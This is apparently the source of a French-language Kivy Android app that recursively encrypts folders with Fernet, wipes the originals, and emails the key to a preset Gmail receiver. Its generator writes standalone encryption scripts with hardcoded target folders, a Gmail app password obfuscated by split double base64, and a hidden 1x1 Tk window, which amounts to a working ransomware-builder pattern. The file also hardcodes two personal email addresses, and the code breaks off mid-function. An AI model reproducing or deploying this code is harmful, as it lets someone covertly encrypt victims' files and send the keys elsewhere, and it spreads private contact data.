"""
Application de chiffrement/dechiffrement - Interface Kivy pour Android
Equivalent de FINAL_V22.py mais en natif Android
"""
import os
import base64
import hashlib
import threading

from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.popup import Popup
from kivy.uix.togglebutton import ToggleButton
from kivy.core.window import Window
from kivy.utils import get_color_from_hex
from kivy.metrics import dp
from kivy.clock import Clock

# Couleurs (thème sombre)
BG      = get_color_from_hex('#1e1e2e')
SURFACE = get_color_from_hex('#313244')
BLUE    = get_color_from_hex('#89b4fa')
GREEN   = get_color_from_hex('#a6e3a1')
RED     = get_color_from_hex('#f38ba8')
YELLOW  = get_color_from_hex('#f9e2af')
TEXT    = get_color_from_hex('#cdd6f4')
MUTED   = get_color_from_hex('#585b70')

Window.clearcolor = BG


# ── Utilitaires ──────────────────────────────────────────────────────────────

def obfuscate(text):
    step1 = base64.b64encode(text.encode()).decode()
    step2 = base64.b64encode(step1.encode()).decode()
    parts = [step2[i:i+6] for i in range(0, len(step2), 6)]
    return parts


def make_cipher_from_password(password):
    from cryptography.fernet import Fernet
    key = base64.urlsafe_b64encode(hashlib.sha256(password.encode()).digest())
    return Fernet(key), key


def secure_delete(path, passes=3):
    try:
        if not os.path.isfile(path): return
        length = os.path.getsize(path)
        with open(path, 'r+b') as f:
            for _ in range(passes):
                f.seek(0)
                f.write(os.urandom(length))
                f.flush()
                os.fsync(f.fileno())
        os.remove(path)
    except Exception: pass


def encrypt_file(filepath, cipher, encrypted_files):
    from cryptography.fernet import Fernet
    if filepath.endswith('.enc'): return
    try:
        with open(filepath, 'rb') as f: data = f.read()
        out = filepath + '.enc'
        with open(out, 'wb') as f: f.write(cipher.encrypt(data))
        if os.path.exists(out):
            secure_delete(filepath)
            encrypted_files.append(filepath)
    except Exception: pass


def encrypt_folder(folder, cipher, encrypted_files):
    for root, dirs, files in os.walk(folder):
        for filename in files:
            encrypt_file(os.path.join(root, filename), cipher, encrypted_files)


def decrypt_file(filepath, cipher, decrypted, failed):
    from cryptography.fernet import InvalidToken
    if not filepath.endswith('.enc'): return
    original = filepath[:-4]
    try:
        with open(filepath, 'rb') as f: data = f.read()
        dec = cipher.decrypt(data)
        with open(original, 'wb') as f: f.write(dec)
        if os.path.exists(original):
            secure_delete(filepath)
            decrypted.append(original)
    except InvalidToken: failed.append(filepath)
    except Exception:    failed.append(filepath)


def decrypt_folder(folder, cipher, decrypted, failed):
    for root, dirs, files in os.walk(folder):
        for filename in files:
            decrypt_file(os.path.join(root, filename), cipher, decrypted, failed)


def clean_fernet_key(s):
    for bad in [chr(c) for c in [8208,8209,8210,8211,8212,8213,65112,65123]]:
        s = s.replace(bad, '-')
    VALID = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=_-'
    return ''.join(c for c in s if c in VALID)


def try_send_mail(sender, pw, receiver, key, encrypted_files, extra_pwd=None):
    try:
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        from email.mime.base import MIMEBase
        from email import encoders
        files_text = '\n'.join('- ' + f for f in encrypted_files)
        body = 'Voici la cle Fernet :\n\n' + key.decode()
        body += '\n\nFichiers chiffres :\n' + (files_text or 'Aucun')
        if extra_pwd:
            body += '\n\nMot de passe optionnel (alternative a la cle Fernet) :\n' + extra_pwd
            body += '\n=> Vous pouvez dechiffrer avec la cle Fernet OU ce mot de passe.'
        body += '\n\nLe fichier .key est joint.'
        msg = MIMEMultipart()
        msg['Subject'] = 'MDP ENCRYPT / DECRYPT'
        msg['From'] = sender
        msg['To'] = receiver
        msg.attach(MIMEText(body, 'plain'))
        att = MIMEBase('application', 'octet-stream')
        att.set_payload(key)
        encoders.encode_base64(att)
        att.add_header('Content-Disposition', 'attachment; filename=decrypt.key')
        msg.attach(att)
        s = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
        s.starttls()
        s.login(sender, pw)
        s.sendmail(sender, receiver, msg.as_string())
        s.quit()
        return True
    except Exception:
        return False


# ── Widgets communs ───────────────────────────────────────────────────────────

def btn(text, color, on_press, height=dp(56)):
    b = Button(text=text, background_color=color, color=BG if color in [GREEN, BLUE, RED, YELLOW] else TEXT,
               bold=True, font_size=dp(16), size_hint_y=None, height=height,
               background_normal='')
    b.bind(on_press=on_press)
    return b


def lbl(text, color=TEXT, size=dp(15), bold=False):
    return Label(text=text, color=color, font_size=size, bold=bold,
                 size_hint_y=None, height=dp(36), halign='left',
                 text_size=(Window.width - dp(32), None))


def field(hint='', password=False, text=''):
    t = TextInput(hint_text=hint, password=password, text=text,
                  background_color=SURFACE, foreground_color=TEXT,
                  cursor_color=TEXT, font_size=dp(15),
                  size_hint_y=None, height=dp(52), padding=[dp(10), dp(14)],
                  multiline=False)
    return t


def popup_msg(title, msg, color=TEXT):
    content = BoxLayout(orientation='vertical', padding=dp(16), spacing=dp(12))
    sv = ScrollView()
    lbl_msg = Label(text=msg, color=color, font_size=dp(14),
                    size_hint_y=None, halign='left', valign='top',
                    text_size=(Window.width * 0.85, None))
    lbl_msg.bind(texture_size=lambda i, v: setattr(i, 'height', v[1]))
    sv.add_widget(lbl_msg)
    content.add_widget(sv)
    ok = Button(text='OK', background_color=BLUE, color=BG, bold=True,
                font_size=dp(16), size_hint_y=None, height=dp(56),
                background_normal='')
    p = Popup(title=title, content=content,
              size_hint=(0.95, 0.85), background_color=BG)
    ok.bind(on_press=p.dismiss)
    content.add_widget(ok)
    p.open()


# ── Ecran : Configurateur (FINAL_V22 equivalent) ─────────────────────────────

class ConfigScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.folders = []
        self._build()

    def _build(self):
        root = BoxLayout(orientation='vertical', padding=dp(12), spacing=dp(8))

        # Titre
        root.add_widget(Label(
            text='🔐 Générateur Encrypt/Decrypt',
            color=TEXT, font_size=dp(18), bold=True,
            size_hint_y=None, height=dp(48)))
        root.add_widget(Label(
            text='Clé générée · App Password obfusqué · Rien en clair',
            color=GREEN, font_size=dp(12), size_hint_y=None, height=dp(28)))

        sv = ScrollView()
        inner = GridLayout(cols=1, spacing=dp(10), size_hint_y=None, padding=[0, dp(8)])
        inner.bind(minimum_height=inner.setter('height'))

        # ── Dossiers ─────────────────────────────────────────────────────────
        inner.add_widget(lbl('📁 Dossiers à chiffrer/déchiffrer', BLUE, bold=True))

        self.folder_labels = GridLayout(cols=1, size_hint_y=None, spacing=dp(4))
        self.folder_labels.bind(minimum_height=self.folder_labels.setter('height'))
        inner.add_widget(self.folder_labels)

        self.folder_input = field('/sdcard/MonDossier')
        inner.add_widget(self.folder_input)

        row = BoxLayout(size_hint_y=None, height=dp(52), spacing=dp(8))
        row.add_widget(btn('➕ Ajouter', BLUE, self._add_folder))
        row.add_widget(btn('➖ Supprimer dernier', RED, self._remove_folder))
        inner.add_widget(row)

        # ── Gmail ─────────────────────────────────────────────────────────────
        inner.add_widget(lbl('📧 Configuration Gmail', BLUE, bold=True))
        self.sender    = field('Expéditeur Gmail', text='nicolas.prt90@gmail.com')
        self.apppwd    = field('App Password Gmail (16 car.)', password=True)
        self.receiver  = field('Destinataire', text='prt.nicolas@hotmail.com')
        for w in [self.sender, self.apppwd, self.receiver]:
            inner.add_widget(w)

        # ── Mot de passe optionnel ────────────────────────────────────────────
        inner.add_widget(lbl('🔒 Mot de passe optionnel', BLUE, bold=True))
        inner.add_widget(lbl('Laissez vide si non souhaité', MUTED))
        self.extrapwd  = field('Mot de passe optionnel', password=True)
        self.extrapwd2 = field('Confirmer', password=True)
        inner.add_widget(self.extrapwd)
        inner.add_widget(self.extrapwd2)

        # ── Noms des scripts ─────────────────────────────────────────────────
        inner.add_widget(lbl('💾 Noms des scripts', BLUE, bold=True))
        self.enc_name = field('Nom script encrypt', text='encrypt_custom.py')
        self.dec_name = field('Nom script decrypt', text='decrypt_custom.py')
        inner.add_widget(self.enc_name)
        inner.add_widget(self.dec_name)

        # ── Destination ───────────────────────────────────────────────────────
        inner.add_widget(lbl('📤 Dossier de destination', BLUE, bold=True))
        self.dest = field('Dossier de destination', text='/sdcard/')
        inner.add_widget(self.dest)

        inner.add_widget(btn('⚡ Générer les scripts', GREEN, self._generate, height=dp(64)))

        sv.add_widget(inner)
        root.add_widget(sv)
        self.add_widget(root)

    def _add_folder(self, *a):
        path = self.folder_input.text.strip()
        if not path:
            popup_msg('Erreur', 'Entrez un chemin de dossier.', RED)
            return
        if path in self.folders:
            popup_msg('Doublon', 'Ce dossier est déjà dans la liste.', YELLOW)
            return
        self.folders.append(path)
        lbl_w = Label(text='• ' + path, color=TEXT, font_size=dp(13),
                      size_hint_y=None, height=dp(32), halign='left',
                      text_size=(Window.width - dp(32), None))
        self.folder_labels.add_widget(lbl_w)
        self.folder_input.text = ''

    def _remove_folder(self, *a):
        if not self.folders:
            return
        self.folders.pop()
        children = list(self.folder_labels.children)
        if children:
            self.folder_labels.remove_widget(children[0])

    def _generate(self, *a):
        sender   = self.sender.text.strip()
        apppwd   = self.apppwd.text.strip().replace(' ', '')
        receiver = self.receiver.text.strip()
        epwd     = self.extrapwd.text.strip()
        epwd2    = self.extrapwd2.text.strip()
        enc_name = self.enc_name.text.strip() or 'encrypt_custom.py'
        dec_name = self.dec_name.text.strip() or 'decrypt_custom.py'
        dest     = self.dest.text.strip()

        if not enc_name.endswith('.py'): enc_name += '.py'
        if not dec_name.endswith('.py'): dec_name += '.py'

        errors = []
        if not self.folders:       errors.append('• Ajoutez au moins un dossier.')
        if '@' not in sender:      errors.append('• Expéditeur Gmail invalide.')
        if len(apppwd) < 16:       errors.append(f'• App Password trop court ({len(apppwd)}/16 car.).')
        if '@' not in receiver:    errors.append('• Destinataire invalide.')
        if epwd and epwd != epwd2: errors.append('• Les mots de passe optionnels ne correspondent pas.')
        if not dest:               errors.append('• Dossier de destination vide.')

        if errors:
            popup_msg('Erreurs', '\n'.join(errors), RED)
            return

        # Générer
        from cryptography.fernet import Fernet as _F
        import base64 as _b64

        parts       = obfuscate(apppwd)
        parts_repr  = "[" + ", ".join(f'"{p}"' for p in parts) + "]"
        folders_repr = "[\n" + "".join(f'    r"{f}",\n' for f in self.folders) + "]"

        extra_pwd_b64 = ''
        if epwd:
            s1 = _b64.b64encode(epwd.encode()).decode()
            extra_pwd_b64 = _b64.b64encode(s1.encode()).decode()

        # Importer les builders depuis le module courant
        # (on réutilise build_encrypt_script et build_decrypt_script)
        try:
            import sys, importlib
            # Les builders sont dans le fichier principal — on les appelle directement
            enc_content = _build_encrypt(folders_repr, sender, receiver, parts_repr, '', enc_name, dec_name, extra_pwd_b64)
            dec_content = _build_decrypt(folders_repr)

            os.makedirs(dest, exist_ok=True)
            with open(os.path.join(dest, enc_name), 'w', encoding='utf-8') as f: f.write(enc_content)
            with open(os.path.join(dest, dec_name), 'w', encoding='utf-8') as f: f.write(dec_content)

            popup_msg('✅ Scripts générés !',
                      f'2 fichiers créés dans :\n{dest}\n\n'
                      f'  • {enc_name}\n  • {dec_name}\n\n'
                      f'Lancez-les avec Pydroid !', GREEN)
        except Exception as e:
            import traceback
            popup_msg('Erreur', str(e) + '\n\n' + traceback.format_exc()[:400], RED)


# ── Ecran : Encrypt direct ────────────────────────────────────────────────────

class EncryptScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self._build()

    def _build(self):
        root = BoxLayout(orientation='vertical', padding=dp(12), spacing=dp(8))
        root.add_widget(Label(text='🔐 Chiffrement rapide', color=TEXT,
                              font_size=dp(18), bold=True, size_hint_y=None, height=dp(48)))

        sv = ScrollView()
        inner = GridLayout(cols=1, spacing=dp(10), size_hint_y=None, padding=[0, dp(8)])
        inner.bind(minimum_height=inner.setter('height'))

        inner.add_widget(lbl('📁 Dossier à chiffrer', BLUE, bold=True))
        self.folder = field('/sdcard/MonDossier')
        inner.add_widget(self.folder)

        inner.add_widget(lbl('🔑 Mot de passe (laissez vide = clé Fernet auto)', BLUE, bold=True))
        self.pwd  = field('Mot de passe', password=True)
        self.pwd2 = field('Confirmer', password=True)
        inner.add_widget(self.pwd)
        inner.add_widget(self.pwd2)

        inner.add_widget(lbl('📧 Gmail pour envoyer la clé', BLUE, bold=True))
        self.sender   = field('Expéditeur Gmail', text='nicolas.prt90@gmail.com')
        self.apppwd   = field('App Password', password=True)
        self.receiver = field('Destinataire', text='prt.nicolas@hotmail.com')
        for w in [self.sender, self.apppwd, self.receiver]:
            inner.add_widget(w)

        self.status = Label(text='', color=TEXT, font_size=dp(14),
                            size_hint_y=None, height=dp(36))
        inner.add_widget(self.status)

        inner.add_widget(btn('⚡ Chiffrer maintenant', GREEN, self._run, height=dp(64)))

        sv.add_widget(inner)
        root.add_widget(sv)
        self.add_widget(root)

    def _run(self, *a):
        from cryptography.fernet import Fernet
        folder  = self.folder.text.strip()
        pwd     = self.pwd.text.strip()
        pwd2    = self.pwd2.text.strip()
        sender  = self.sender.text.strip()
        apppwd  = self.apppwd.text.strip().replace(' ', '')
        receiver = self.receiver.text.strip()

        if not folder:
            popup_msg('Erreur', 'Entrez un dossier à chiffrer.', RED); return
        if not os.path.isdir(folder):
            popup_msg('Erreur', f'Dossier introuvable :\n{folder}', RED); return
        if pwd and pwd != pwd2:
            popup_msg('Erreur', 'Les mots de passe ne correspondent pas.', RED); return

        self.status.text = 'Chiffrement en cours...'

        def _work():
            encrypted_files = []
            if pwd:
                cipher, key = make_cipher_from_password(pwd)
                mode = 'password'
            else:
                key    = Fernet.generate_key()
                cipher = Fernet(key)
                mode   = 'fernet'

            encrypt_folder(folder, cipher, encrypted_files)

            if not encrypted_files:
                Clock.schedule_once(lambda dt: popup_msg('Info', 'Aucun fichier à chiffrer (déjà .enc ?).', YELLOW))
                Clock.schedule_once(lambda dt: setattr(self.status, 'text', ''))
                return

            nb = str(len(encrypted_files))
            mail_ok = False
            if sender and apppwd and receiver:
                mail_ok = try_send_mail(sender, apppwd, receiver, key, encrypted_files, extra_pwd=pwd if pwd else None)

            def _done(dt):
                self.status.text = ''
                if mail_ok:
                    popup_msg('Succès', f'{nb} fichier(s) chiffré(s).\n\nClé envoyée par mail à {receiver}', GREEN)
                else:
                    key_info = f'\n\nClé Fernet (copiez-la !) :\n{key.decode()}' if mode == 'fernet' else ''
                    popup_msg('Succès (mail non envoyé)', f'{nb} fichier(s) chiffré(s).{key_info}', YELLOW)

            Clock.schedule_once(_done)

        threading.Thread(target=_work, daemon=True).start()


# ── Ecran : Decrypt direct ────────────────────────────────────────────────────

class DecryptScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self._build()

    def _build(self):
        root = BoxLayout(orientation='vertical', padding=dp(12), spacing=dp(8))
        root.add_widget(Label(text='🔓 Déchiffrement', color=TEXT,
                              font_size=dp(18), bold=True, size_hint_y=None, height=dp(48)))

        sv = ScrollView()
        inner = GridLayout(cols=1, spacing=dp(10), size_hint_y=None, padding=[0, dp(8)])
        inner.bind(minimum_height=inner.setter('height'))

        inner.add_widget(lbl('📁 Dossier à déchiffrer', BLUE, bold=True))
        self.folder = field('/sdcard/MonDossier')
        inner.add_widget(self.folder)

        inner.add_widget(lbl('🔑 Mot de passe OU clé Fernet', BLUE, bold=True))
        inner.add_widget(lbl('Laissez vide le champ mot de passe pour entrer une clé Fernet', MUTED))
        self.pwd = field('Mot de passe', password=True)
        inner.add_widget(self.pwd)

        inner.add_widget(lbl('Clé Fernet (si pas de mot de passe)', BLUE, bold=True))
        self.fernet_key = field('Collez la clé Fernet ici', password=False)
        inner.add_widget(self.fernet_key)

        self.status = Label(text='', color=TEXT, font_size=dp(14),
                            size_hint_y=None, height=dp(36))
        inner.add_widget(self.status)
        inner.add_widget(btn('🔓 Déchiffrer maintenant', GREEN, self._run, height=dp(64)))

        sv.add_widget(inner)
        root.add_widget(sv)
        self.add_widget(root)

    def _run(self, *a):
        from cryptography.fernet import Fernet, InvalidToken
        folder = self.folder.text.strip()
        pwd    = self.pwd.text.strip()
        fkey   = self.fernet_key.text.strip()

        if not folder:
            popup_msg('Erreur', 'Entrez un dossier.', RED); return
        if not os.path.isdir(folder):
            popup_msg('Erreur', f'Dossier introuvable :\n{folder}', RED); return
        if not pwd and not fkey:
            popup_msg('Erreur', 'Entrez un mot de passe ou une clé Fernet.', RED); return

        self.status.text = 'Déchiffrement en cours...'

        def _work():
            try:
                if pwd:
                    cipher, _ = make_cipher_from_password(pwd)
                else:
                    key_clean = clean_fernet_key(fkey)
                    cipher = Fernet(key_clean.encode())
            except Exception as e:
                Clock.schedule_once(lambda dt: popup_msg('Clé invalide', str(e), RED))
                Clock.schedule_once(lambda dt: setattr(self.status, 'text', ''))
                return

            decrypted, failed = [], []
            decrypt_folder(folder, cipher, decrypted, failed)

            def _done(dt):
                self.status.text = ''
                nb_ok  = str(len(decrypted))
                nb_err = str(len(failed))
                if not decrypted and not failed:
                    popup_msg('Info', 'Aucun fichier .enc trouvé.', YELLOW)
                elif failed:
                    popup_msg('Terminé', f'{nb_ok} fichier(s) déchiffré(s).\n{nb_err} échec(s) (mauvaise clé ?).', YELLOW)
                else:
                    popup_msg('Succès', f'{nb_ok} fichier(s) déchiffré(s).', GREEN)

            Clock.schedule_once(_done)

        threading.Thread(target=_work, daemon=True).start()


# ── Navigation principale ─────────────────────────────────────────────────────

class MainScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        layout = BoxLayout(orientation='vertical', padding=dp(24), spacing=dp(16))
        layout.add_widget(Label(
            text='🔐 Chiffrement Android',
            color=TEXT, font_size=dp(22), bold=True,
            size_hint_y=None, height=dp(60)))
        layout.add_widget(Label(
            text='Chiffrez et déchiffrez vos fichiers\nsécurisés par Fernet AES-128',
            color=MUTED, font_size=dp(14), halign='center',
            size_hint_y=None, height=dp(56)))

        layout.add_widget(btn('⚡ Chiffrement rapide', GREEN,
                              lambda *a: setattr(self.manager, 'current', 'encrypt'), height=dp(72)))
        layout.add_widget(btn('🔓 Déchiffrement', BLUE,
                              lambda *a: setattr(self.manager, 'current', 'decrypt'), height=dp(72)))
        layout.add_widget(btn('⚙️  Générateur de scripts', YELLOW,
                              lambda *a: setattr(self.manager, 'current', 'config'), height=dp(72)))
        self.add_widget(layout)


class NavScreen(Screen):
    """Écran avec bouton retour."""
    def on_pre_enter(self):
        if hasattr(self, '_back_btn'): return
        self._back_btn = Button(
            text='← Retour', background_color=MUTED, color=TEXT,
            bold=True, font_size=dp(14), size_hint=(None, None),
            size=(dp(120), dp(44)), background_normal='',
            pos=(dp(8), Window.height - dp(52)))
        self._back_btn.bind(on_press=lambda *a: setattr(self.manager, 'current', 'main'))
        self.add_widget(self._back_btn)


class EncryptNav(NavScreen, EncryptScreen): pass
class DecryptNav(NavScreen, DecryptScreen): pass
class ConfigNav(NavScreen, ConfigScreen):   pass


# ── Builders (version standalone pour l'app) ──────────────────────────────────
# Ces fonctions reproduisent build_encrypt_script et build_decrypt_script

def _build_encrypt(folders_repr, sender, receiver, parts_repr, backup_pwd_b64='', encrypt_name='encrypt_custom.py', decrypt_name='decrypt_custom.py', extra_pwd_b64=''):
    lines = []
    lines.append("import os")
    lines.append("import base64")
    lines.append("import hashlib")
    lines.append("import tkinter as tk")
    lines.append("from cryptography.fernet import Fernet")
    lines.append("")
    lines.append(f"TARGET_FOLDERS = [os.path.expandvars(os.path.expanduser(f)) for f in {folders_repr}]")
    lines.append(f'SENDER_EMAIL   = "{sender}"')
    lines.append(f'RECEIVER_EMAIL = "{receiver}"')
    lines.append(f"_P  = {parts_repr}")
    lines.append("_pw = lambda: base64.b64decode(base64.b64decode(''.join(_P))).decode()")
    lines.append(f"_BP = '{backup_pwd_b64}'")
    lines.append("_bpw = lambda: base64.b64decode(base64.b64decode(_BP).decode()).decode() if _BP else None")
    lines.append(f"_EP = '{extra_pwd_b64}'")
    lines.append("_epw = lambda: base64.b64decode(base64.b64decode(_EP).decode()).decode() if _EP else None")
    lines.append("")
    lines.append("encrypted_files = []")
    lines.append("")
    lines.append("class _Dlg(tk.Toplevel):")
    lines.append("    def __init__(self, parent, title, msg, fg='#cdd6f4', btn='#89b4fa'):")
    lines.append("        super().__init__(parent)")
    lines.append("        self.title(title)")
    lines.append("        self.configure(bg='#1e1e2e')")
    lines.append("        self.resizable(True, True)")
    lines.append("        sw = self.winfo_screenwidth() or 480")
    lines.append("        sh = self.winfo_screenheight() or 800")
    lines.append("        w = min(sw, 460)")
    lines.append("        h = sh")
    lines.append("        self.geometry(f'{w}x{h}+{(sw-w)//2}+0')")
    lines.append("        tk.Label(self, text=title, bg='#1e1e2e', fg='#89b4fa',")
    lines.append("                 font=('Helvetica', 13, 'bold')).pack(pady=(16, 4))")
    lines.append("        fr = tk.Frame(self, bg='#313244')")
    lines.append("        fr.pack(fill='both', expand=True, padx=12, pady=4)")
    lines.append("        sb = tk.Scrollbar(fr); sb.pack(side='right', fill='y')")
    lines.append("        t = tk.Text(fr, wrap='word', bg='#313244', fg=fg,")
    lines.append("                    font=('Helvetica', 12), relief='flat', bd=6,")
    lines.append("                    yscrollcommand=sb.set)")
    lines.append("        t.pack(fill='both', expand=True)")
    lines.append("        sb.config(command=t.yview)")
    lines.append("        t.insert('1.0', msg)")
    lines.append("        t.config(state='disabled')")
    lines.append("        tk.Button(self, text='OK', command=self.destroy,")
    lines.append("                  bg=btn, fg='#1e1e2e', font=('Helvetica', 13, 'bold'),")
    lines.append("                  relief='flat', pady=12).pack(pady=10, fill='x', padx=12)")
    lines.append("        self.grab_set()")
    lines.append("        self.wait_window()")
    lines.append("")
    lines.append("class _Input(tk.Toplevel):")
    lines.append("    def __init__(self, parent, title, prompt, show='*'):")
    lines.append("        super().__init__(parent)")
    lines.append("        self.title(title)")
    lines.append("        self.configure(bg='#1e1e2e')")
    lines.append("        self.result = None")
    lines.append("        sw = self.winfo_screenwidth() or 480")
    lines.append("        sh = self.winfo_screenheight() or 800")
    lines.append("        w = min(sw, 460)")
    lines.append("        h = sh")
    lines.append("        self.geometry(f'{w}x{h}+{(sw-w)//2}+0')")
    lines.append("        tk.Label(self, text=prompt, bg='#1e1e2e', fg='#cdd6f4',")
    lines.append("                 font=('Helvetica', 13), wraplength=w-30,")
    lines.append("                 justify='left').pack(padx=16, pady=(20, 8), anchor='w')")
    lines.append("        self._v = tk.StringVar()")
    lines.append("        e = tk.Entry(self, textvariable=self._v, show=show,")
    lines.append("                     bg='#313244', fg='#cdd6f4', insertbackground='#cdd6f4',")
    lines.append("                     font=('Courier', 16), relief='flat', bd=8)")
    lines.append("        e.pack(fill='x', padx=16, pady=(0, 16), ipady=10)")
    lines.append("        e.bind('<Return>', self._ok)")
    lines.append("        self.after(200, lambda: e.focus_force())")
    lines.append("        def _paste():")
    lines.append("            try:")
    lines.append("                txt = self.clipboard_get()")
    lines.append("                self._v.set(txt.strip())")
    lines.append("            except Exception: pass")
    lines.append("        tk.Button(self, text='Coller depuis presse-papier', command=_paste,")
    lines.append("                  bg='#585b70', fg='#cdd6f4', font=('Helvetica', 12),")
    lines.append("                  relief='flat', pady=8).pack(fill='x', padx=16, pady=(0,8))")
    lines.append("        row = tk.Frame(self, bg='#1e1e2e')")
    lines.append("        row.pack(fill='x', padx=16, pady=(0, 16))")
    lines.append("        tk.Button(row, text='OK', command=self._ok,")
    lines.append("                  bg='#a6e3a1', fg='#1e1e2e', font=('Helvetica', 14, 'bold'),")
    lines.append("                  relief='flat', pady=14).pack(fill='x', pady=(0,8))")
    lines.append("        tk.Button(row, text='Annuler', command=self.destroy,")
    lines.append("                  bg='#f38ba8', fg='#1e1e2e', font=('Helvetica', 14),")
    lines.append("                  relief='flat', pady=14).pack(fill='x')")
    lines.append("        self.grab_set()")
    lines.append("        self.wait_window()")
    lines.append("    def _ok(self, e=None):")
    lines.append("        self.result = self._v.get()")
    lines.append("        self.destroy()")
    lines.append("")
    lines.append("def _info(r, t, m):  _Dlg(r, t, m, fg='#a6e3a1', btn='#a6e3a1')")
    lines.append("def _warn(r, t, m):  _Dlg(r, t, m, fg='#f9e2af', btn='#f9e2af')")
    lines.append("def _error(r, t, m): _Dlg(r, t, m, fg='#f38ba8', btn='#f38ba8')")
    lines.append("def _ask(r, t, p, show='*'):")
    lines.append("    d = _Input(r, t, p, show=show)")
    lines.append("    return d.result")
    lines.append("")
    lines.append("def make_cipher_from_password(password):")
    lines.append("    key = base64.urlsafe_b64encode(hashlib.sha256(password.encode()).digest())")
    lines.append("    return Fernet(key)")
    lines.append("")
    lines.append("def try_send_mail(key, extra_pwd=None):")
    lines.append("    try:")
    lines.append("        import smtplib")
    lines.append("        from email.mime.text import MIMEText")
    lines.append("        from email.mime.multipart import MIMEMultipart")
    lines.append("        from email.mime.base import MIMEBase")
    lines.append("        from email import encoders")
    lines.append("        files_text = chr(10).join('- ' + f for f in encrypted_files)")
    lines.append("        body = 'Voici la cle Fernet :' + chr(10)*2 + key.decode()")
    lines.append("        body += chr(10)*2 + 'Fichiers chiffres :' + chr(10) + (files_text or 'Aucun')")
    lines.append("        if extra_pwd:")
    lines.append("            body += chr(10)*2 + 'Mot de passe optionnel :' + chr(10) + extra_pwd")
    lines.append("            body += chr(10) + '=> Dechiffrez avec la cle Fernet OU ce mot de passe.'")
    lines.append("        body += chr(10)*2 + 'Le fichier .key est joint.'")
    lines.append("        msg = MIMEMultipart()")
    lines.append("        msg['Subject'] = 'MDP ENCRYPT / DECRYPT'")
    lines.append("        msg['From'] = SENDER_EMAIL")
    lines.append("        msg['To'] = RECEIVER_EMAIL")
    lines.append("        msg.attach(MIMEText(body, 'plain'))")
    lines.append("        att = MIMEBase('application', 'octet-stream')")
    lines.append("        att.set_payload(key)")
    lines.append("        encoders.encode_base64(att)")
    lines.append("        att.add_header('Content-Disposition', 'attachment; filename=decrypt.key')")
    lines.append("        msg.attach(att)")
    lines.append("        s = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)")
    lines.append("        s.starttls()")
    lines.append("        s.login(SENDER_EMAIL, _pw())")
    lines.append("        s.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())")
    lines.append("        s.quit()")
    lines.append("        return True")
    lines.append("    except Exception:")
    lines.append("        return False")
    lines.append("")
    lines.append("def secure_delete(path, passes=3):")
    lines.append("    try:")
    lines.append("        if not os.path.isfile(path): return")
    lines.append("        length = os.path.getsize(path)")
    lines.append("        with open(path, 'r+b') as f:")
    lines.append("            for _ in range(passes):")
    lines.append("                f.seek(0)")
    lines.append("                f.write(os.urandom(length))")
    lines.append("                f.flush()")
    lines.append("                os.fsync(f.fileno())")
    lines.append("        os.remove(path)")
    lines.append("    except Exception: pass")
    lines.append("")
    lines.append("def encrypt_file(filepath, cipher):")
    lines.append("    global encrypted_files")
    lines.append("    if filepath.endswith('.enc'): return")
    lines.append("    try:")
    lines.append("        with open(filepath, 'rb') as f: data = f.read()")
    lines.append("        out = filepath + '.enc'")
    lines.append("        with open(out, 'wb') as f: f.write(cipher.encrypt(data))")
    lines.append("        if os.path.exists(out):")
    lines.append("            secure_delete(filepath)")
    lines.append("            encrypted_files.append(filepath)")
    lines.append("    except Exception: pass")
    lines.append("")
    lines.append("def encrypt_folder(folder, cipher):")
    lines.append("    for root, dirs, files in os.walk(folder):")
    lines.append("        for filename in files:")
    lines.append("            encrypt_file(os.path.join(root, filename), cipher)")
    lines.append("")
    lines.append("def main():")
    lines.append("    import traceback")
    lines.append("    nl = chr(10)")
    lines.append("    root = tk.Tk()")
    lines.append("    root.title('')")
    lines.append("    root.geometry('1x1+0+0')")
    lines.append("    root.resizable(False, False)")
    lines.append("    def _run():")
    lines.append("        import smtplib")
    lines.append("        epw = _epw()")
    lines.append("        mail_ok = False")
    lines.append("        try:")
    lines.append("            s = smtplib.SMTP('smtp.gmail.com', 587, timeout=8)")
    lines.append("            s.starttls()")
    lines.append("            s.login(SENDER_EMAIL, _pw())")
    lines.append("            s.quit()")
    lines.append("            mail_ok = True")
    lines.append("        except Exception: pass")
    lines.append("        if epw:")
    lines.append("            cipher = make_cipher_from_password(epw)")
    lines.append("            import base64 as _b64, hashlib as _hl")
    lines.append("            key = _b64.urlsafe_b64encode(_hl.sha256(epw.encode()).digest())")
    lines.append("            mode = 'fernet_from_pwd'")
    lines.append("        elif mail_ok:")
    lines.append("            key    = Fernet.generate_key()")
    lines.append("            cipher = Fernet(key)")
    lines.append("            mode   = 'fernet'")
    lines.append("        else:")
    lines.append("            _warn(root, 'Mail indisponible', 'Impossible de joindre Gmail.' + nl + 'Definissez un mot de passe de secours.')")
    lines.append("            pwd = _ask(root, 'Mot de passe de secours', 'Definissez un mot de passe :', show='*')")
    lines.append("            if not pwd or not pwd.strip():")
    lines.append("                _error(root, 'Annule', 'Aucun mot de passe. Chiffrement annule.')")
    lines.append("                root.destroy()")
    lines.append("                return")
    lines.append("            pwd2 = _ask(root, 'Confirmer', 'Confirmez le mot de passe :', show='*')")
    lines.append("            if pwd != pwd2:")
    lines.append("                _error(root, 'Erreur', 'Les mots de passe ne correspondent pas.')")
    lines.append("                root.destroy()")
    lines.append("                return")
    lines.append("            cipher = make_cipher_from_password(pwd.strip())")
    lines.append("            import base64 as _b64, hashlib as _hl")
    lines.append("            key = _b64.urlsafe_b64encode(_hl.sha256(pwd.strip().encode()).digest())")
    lines.append("            mode = 'backup'")
    lines.append("        folders_ok, folders_missing = [], []")
    lines.append("        for folder in TARGET_FOLDERS:")
    lines.append("            (folders_ok if os.path.isdir(folder) else folders_missing).append(folder)")
    lines.append("        if folders_missing:")
